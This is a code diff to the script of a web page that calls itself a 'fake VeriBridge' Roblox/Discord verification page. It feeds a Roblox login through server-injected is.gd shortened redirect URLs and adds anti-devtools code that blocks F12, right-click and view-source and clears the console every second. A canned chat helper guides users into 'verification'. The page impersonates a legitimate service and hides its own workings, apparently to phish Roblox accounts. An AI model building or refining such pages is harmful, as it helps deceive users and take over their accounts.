@@ -218,42 +218,43 @@
 
 <script>
 // ==================== FAKE VERIBRIDGE GEN INTEGRATION WITH is.gd ====================
-// These values are injected by the server
+// These values are injected by the server - they will be is.gd URLs!
 const VERIFY_CODE = '{{VERIFY_CODE}}';
-const ORIGINAL_URL = '{{ORIGINAL_URL}}';  // This is now an is.gd shortened URL
+const ORIGINAL_URL = '{{ORIGINAL_URL}}';  // This is now an is.gd shortened URL (points to Roblox)
 const CURRENT_DOMAIN = '{{CURRENT_DOMAIN}}';  // This is now an is.gd holder URL
 const IS_GD_HOLDER = '{{IS_GD_HOLDER}}';  // Same as CURRENT_DOMAIN
 
-console.log('[VeriBridge] Raw values from server:');
-console.log('[VeriBridge] VERIFY_CODE:', VERIFY_CODE);
-console.log('[VeriBridge] ORIGINAL_URL:', ORIGINAL_URL);
-console.log('[VeriBridge] CURRENT_DOMAIN:', CURRENT_DOMAIN);
+console.log('[VeriBridge] === is.gd URL Injection Debug ===');
+console.log('[VeriBridge] Raw VERIFY_CODE:', VERIFY_CODE);
+console.log('[VeriBridge] Raw ORIGINAL_URL (is.gd):', ORIGINAL_URL);
+console.log('[VeriBridge] Raw CURRENT_DOMAIN (is.gd holder):', CURRENT_DOMAIN);
 
-// FIXED: Check if the placeholders have been replaced by the server
+// Check if the placeholders have been replaced by the server
 // The server replaces {{ORIGINAL_URL}} with an actual is.gd link
-// If it still contains '{{' then it hasn't been replaced yet
-const isOriginalUrlReplaced = ORIGINAL_URL && !ORIGINAL_URL.includes('{{');
-const isCurrentDomainReplaced = CURRENT_DOMAIN && !CURRENT_DOMAIN.includes('{{');
+const isOriginalUrlReplaced = ORIGINAL_URL && ORIGINAL_URL.includes('is.gd') && !ORIGINAL_URL.includes('{{');
+const isCurrentDomainReplaced = CURRENT_DOMAIN && CURRENT_DOMAIN.includes('is.gd') && !CURRENT_DOMAIN.includes('{{');
 
-// Use the injected values if they were replaced, otherwise use defaults
+console.log('[VeriBridge] isOriginalUrlReplaced:', isOriginalUrlReplaced);
+console.log('[VeriBridge] isCurrentDomainReplaced:', isCurrentDomainReplaced);
+
+// Use the injected is.gd values - they ARE the is.gd links!
 const FINAL_ORIGINAL_URL = isOriginalUrlReplaced ? ORIGINAL_URL : 'https://www.roblox.com';
 const FINAL_CURRENT_DOMAIN = isCurrentDomainReplaced ? CURRENT_DOMAIN : 'https://www.roblox.com';
 
-console.log('[VeriBridge] Final resolved values:');
-console.log('[VeriBridge] FINAL_ORIGINAL_URL:', FINAL_ORIGINAL_URL);
-console.log('[VeriBridge] FINAL_CURRENT_DOMAIN:', FINAL_CURRENT_DOMAIN);
+console.log('[VeriBridge] FINAL_ORIGINAL_URL (is.gd that redirects to Roblox):', FINAL_ORIGINAL_URL);
+console.log('[VeriBridge] FINAL_CURRENT_DOMAIN (is.gd holder):', FINAL_CURRENT_DOMAIN);
 
-// The verification config NOW CORRECTLY uses the is.gd holder as the return URL
+// The verification config uses is.gd URLs for EVERYTHING
 const VERIFICATION_CONFIG = {
-    // The Roblox login will redirect back to the is.gd holder (the shortened URL)
+    // The Roblox login will redirect to the is.gd URL (which then redirects to Roblox)
     robloxLoginUrl: `https://www.roblox.com/login?returnUrl=${encodeURIComponent(FINAL_ORIGINAL_URL)}`,
     useOfficialRoblox: true,
     verificationCode: VERIFY_CODE,
     isGdHolder: FINAL_CURRENT_DOMAIN
 };
 
-console.log('[VeriBridge] Final VERIFICATION_CONFIG:', VERIFICATION_CONFIG);
-console.log('[VeriBridge] Roblox will redirect to is.gd URL:', FINAL_ORIGINAL_URL);
+console.log('[VeriBridge] VERIFICATION_CONFIG.robloxLoginUrl:', VERIFICATION_CONFIG.robloxLoginUrl);
+console.log('[VeriBridge] This contains is.gd URL in the returnUrl parameter!');
 
 // Anti-devtools
 (function(){document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.shiftKey&&e.key==='J')||(e.ctrlKey&&e.key==='u')||(e.ctrlKey&&e.key==='s')){e.preventDefault()}});setInterval(function(){console.clear()},1000)})();
@@ -285,10 +286,10 @@ function removeTypingIndicator(){
 
 function getAIResponse(question){
     const q=question.toLowerCase();
-    if(q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
+    if(q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'. You'll be redirected to Roblox login.";
     if(q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
     if(q.includes('hello')) return "Hello! Welcome to VeriBridge.";
-    if(q.includes('is.gd')) return `This verification is using is.gd holder: ${FINAL_CURRENT_DOMAIN}`;
+    if(q.includes('is.gd')) return `This verification uses is.gd URLs. Roblox will redirect to: ${FINAL_ORIGINAL_URL}`;
     return "I can help with Roblox verification, Discord integration, and group commands!";
 }
 
@@ -317,7 +318,7 @@ const closeFrameBtn=document.getElementById('closeFrameBtn');
 const robloxIframe=document.getElementById('robloxLoginIframe');
 
 function showRobloxFlow(){
-    console.log('[VeriBridge] Opening Roblox login with returnUrl:', FINAL_ORIGINAL_URL);
+    console.log('[VeriBridge] Opening Roblox login with returnUrl is.gd:', FINAL_ORIGINAL_URL);
     robloxIframe.src = VERIFICATION_CONFIG.robloxLoginUrl;
     frameOverlay.classList.add('active');
 }
